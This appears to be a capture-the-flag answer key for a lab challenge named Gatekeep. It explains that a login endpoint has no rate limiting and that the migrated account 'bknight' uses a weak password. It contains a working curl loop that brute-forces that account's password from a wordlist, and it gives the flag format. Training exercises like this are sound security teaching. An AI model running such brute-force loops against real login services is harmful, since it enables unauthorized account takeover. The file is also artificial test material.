# AUTH / NoRateLimit — Gatekeep

Bug: `POST /login` has **no rate limiting** (no lockout, no delay scaling, no
captcha). A forum-era account `bknight` (see `GET /api/users`) was migrated
with a weak rockyou-style password.

Why exploitable: with unlimited attempts a small wordlist walk finds the
password in minutes. The login has only a tiny artificial per-attempt delay.

Intended path (wordlist loop, e.g. rockyou top slice):
```sh
while read pw; do
  curl -s -H 'content-type: application/json' \
       -d "{\"username\":\"bknight\",\"password\":\"$pw\"}" \
       http://victim.target.lab:8119/login | grep -q '"ok":true' && echo "FOUND: $pw" && break
done < wordlist.txt
```
1. Sign in as `bknight` with the recovered password.
2. `GET /flag` — the server checks the session really belongs to `bknight`
   and returns `DSLTV{AUTH-NoRateLimit-<n>}`.

Flag format: `DSLTV{AUTH-NoRateLimit-<digits>}` — regenerated at every boot.
